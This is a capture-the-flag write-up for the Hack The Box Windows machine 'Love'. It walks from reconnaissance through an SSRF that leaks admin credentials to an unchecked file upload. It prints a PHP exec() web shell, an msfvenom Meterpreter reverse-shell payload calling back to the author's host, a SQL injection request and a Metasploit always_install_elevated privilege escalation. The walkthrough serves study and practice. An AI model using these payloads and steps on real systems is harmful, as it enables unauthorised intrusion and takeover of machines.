#+summary: Write-up for the easy hackthebox machine called love. It's a windows machine, which hosts a voting system that has an authorized insecure file upload vulnerability. There is also an exposed staging area that is vulnerable to ssrf, which leads to gaining the admin credentials for the voting system.
#+filetags: :HTB:write-up:hacking:
* Introduction
Welcome to this write-up for the Hack the Box machine: Love.
Love was an easy rated Windows machine, running a webserver for a voting system and a file scanner located on a staging subdomain.

* Recon
First thing we should do is to get as much information about the box as possible.
First we'll scan for open ports using ~nmap~, once we know what's running on the machine we can tailor the rest of the reconnaissance to better fit.
** Nmap
Since this is just a challenge there is no reason to go super stealthy.
I used the following command to enumerate all open ports, and check which version is running on the port:
: $ sudo nmap -sV -p- -oA nmap/version_scan_all_ports 10.129.48.103
#+caption: Nmap version scan on all ports

Looking at the table below, we can deduce that it is a Windows machine running multiple webservers.

We also got the hostname ~love.htb~ from the scan results, so let's add that to ~/etc/hosts~ file:
: $ sudo echo "10.129.48.103 love.htb" >> /etc/hosts

** Web enumeration
Since there are more than one webserver running, there is the possibility that they are mapped to virtual hosts.
So let's start ~gobuster~ in virtual host mode and start enumerating.
*** Virtual host enumeration
For this enumeration I used the ~subdomains-top1million-20000.txt~ DNS wordlist from the [[https://github.com/danielmiessler/SecLists][SecLists repository]].

~staging.love.htb~ sounds like a development server, which might be filled with vulnerabilties.

This gives us the two targets:
 - ~http://love.htb~
 - ~http://staging.love.htb~

Let's start enumerating files and directories with ~gobuster~.
*** Enumerating ~http://love.htb~

Looking at the scan results from ~gobuster~, we can see that there is an admin interface in the ~/admin/~ directory.
But it can only be accessed using matching credentials.

*** Enumerating ~http://staging.love.htb~
As you can see there isn't a whole lot going on homepage for the staging site.
#+attr_org: :width 700
#+caption: Index page
[[file:assets/2021-07-25_23-47-04_screenshot.png]]
We can see that there is a Demo page, which links to ~/beta.php~.
There is a user input, but looking at the source code of the page we'll see that nothing happens once submitted.

Just to be sure that we don't miss anything, I'll enumerate this server with ~gobuster~.
**** Gobuster
As can be seen on the results below, there isn't anything of interest except for ~/beta.php~.
So let us take a closer look at that!

This could be vulnerable to a Server Side Request Forgery (SSRF) attack.

* Exploitation
We have done all necessary reconnaissance up to this point.
So let us begin attacking this box, by first gaining access to the voting systems admin page.
** Getting admin credentials from ssrf
If we point the site to ~http://127.0.0.1/index.php~, we will see that some of the target website is rendered.
#+caption: SSRF pointing to voter login page
[[file:assets/2021-07-26_00-05-39_screenshot.png]]

The entire request sent by the form can be seen below.

Let's us try the webserver running on port ~5000~, just to see if there is anything interesting.

[[file:assets/2021-07-26_00-14-56_screenshot.png]]

And we got our first set of credentials!
~admin:@LoveIsInTheAir!!!!~
** Logging into ~/admin/~
Now that we have the username and password for the admin area of the voting system, let's login and start poking around at the different functionalities.

Logging in as ~admin~ gives the following interface
#+attr_org: :width 700
#+caption: Admin interface for voting system
[[file:assets/2021-07-26_00-26-15_screenshot.png]]

One of the sites which peaked my interest was the ~/candidates.php~ file in the ~/admin/~ directory.

On this site I poked around found the following three vulnerabilties on this endpoint:
 - XSS
 - SQL injection
 - Insecure File upload

*** XSS
All of the fields for candidates seem, vulnerable to XSS attacks.
It was possible to pop an alert in the description of a candidate.

#+caption: Popping an alert box with XSS
[[file:assets/2021-07-26_00-44-08_screenshot.png]]
However, it didn't seem to be affecting the voters.
And since we are already admin, there is not a that we could gain from this.
*** SQL injection
There was also an error in the implementation of SQL, but I couldn't put it to any use.
#+attr_org: :width 700
#+caption: Error in SQL syntax
[[file:assets/2021-07-26_00-54-21_screenshot.png]]

The parameter vulnerable to SQL injection was the ~plaform~ parameter shown in the POST request below.
#+caption: Request resulting in SQL syntax error
#+begin_example
POST http://love.htb/admin/candidates_edit.php HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0

Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Host: love.htb

id=18&firstname=test&lastname=test&position=8&platform=%27--&edit=
#+end_example
Since SQL injection isn't my strongest attack, I tested the parameter using ~SQLmap~.
But without success.
*** File-upload
This brings us to the last vulnerability, which is also the most powerful.

When creating a candidate, it is possible to upload a photo of the candidate.
But there isn't any checks on what the filetype actually is, meaning we can upload any file we that we want to.
This is the vulnerability we will use to get a shell on the system.
** File-upload on ~/admin/candidates.php~
Because this is a Windows box, I'll be taking the liberty of using the Metasploit framework.
I'll do this in two parts, first we'll create a reverse meterpreter shell.
And a small php script which will execute our meterpreter shell.

The php script that will execute our meterpreter shell, is rather simple as you can see below.
#+caption: Shell execution script
#+begin_src php :tangle shells/rev-shell.php
  <?php
  exec("shell.exe");
  ?>
#+end_src

The meterpreter shell is generated using the ~msfvenom~
#+begin_example
┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/love/shells ]
└─> $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.87 LPORT=4444 -f exe > shell.exe                15:37
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes

#+end_example
And a handler setup in ~msfconsole~ with options matching the ones in the payload generation.

Now we upload both files, and navigate to the php file.
And voila we have a shell!
#+begin_example
meterpreter > getuid
Server username: LOVE\Phoebe
meterpreter >
#+end_example

Let's navigate to the desktop and get the flag!
#+begin_example
meterpreter > cd Desktop
meterpreter > ls

#+end_example
* Priv esc
Now that we have a normal user shell, we should do some enumeration to figure out how we should go about gaining a root shell.

Since this is done through meterpreter, we can use a lot of modules from metasploit.
** Local auto-suggest
This is a very nifty little module, which will suggest local exploits that can be used to elevate privileges.
#+begin_example
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.129.148.112 - Collecting local exploits for x86/windows...
[*] 10.129.148.112 - 38 exploit checks are being tried...
[+] 10.129.148.112 - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] 10.129.148.112 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.148.112 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 10.129.148.112 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.129.148.112 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.129.148.112 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
#+end_example
As you can see the target is vulnerable to the ~always_install_elevated~ exploit.
** Always install elevated
Since the autosuggester mentioned this exploit, let's test if it is correct.
This is done by running the following commands:
#+begin_example
meterpreter > shell
Process 6380 created.
Channel 6 created.

#+end_example
The registrykeys are enabled meaning we are vulnerable, just as the ~local_exploit_suggester~ said we were.

Now we can run the exploit module:
#+begin_example
meterpreter > run exploit/windows/local/always_install_elevated LHOST=10.10.14.87

And a session was created, which means we have root!

Now all we need is to switch to that session, and read the root flag.
#+begin_example
meterpreter > getuid

meterpreter > pwd
C:\Windows\System32
meterpreter > cd /Users/Administrator/Desktop
meterpreter > ls
